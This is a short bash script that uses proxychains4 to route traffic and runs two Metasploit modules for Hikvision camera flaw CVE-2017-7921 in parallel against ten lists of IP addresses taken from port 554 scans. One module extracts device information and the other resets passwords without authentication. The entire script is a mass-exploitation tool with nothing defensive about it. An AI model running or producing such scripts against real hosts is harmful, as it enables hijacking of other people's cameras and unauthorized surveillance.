#!/bin/bash

for i in {1..10}
do
    proxychains4 msfconsole -q -x "use auxiliary/gather/hikvision_info_disclosure_cve_2017_7921; set RHOSTS file:///run/media/kali/DATA/l/port-554/msfconsole/port-554-ips-$i; set RPORT 80; run; exit" -o /tmp/msfconsole-run/gather-$i &
    proxychains4 msfconsole -q -x "use auxiliary/admin/http/hikvision_unauth_pwd_reset_cve_2017_7921; set RHOSTS file:///run/media/kali/DATA/l/port-554/msfconsole/port-554-ips-$i; set RPORT 80; run; exit" -o /tmp/msfconsole-run/unauth-$i &
done

exit 0
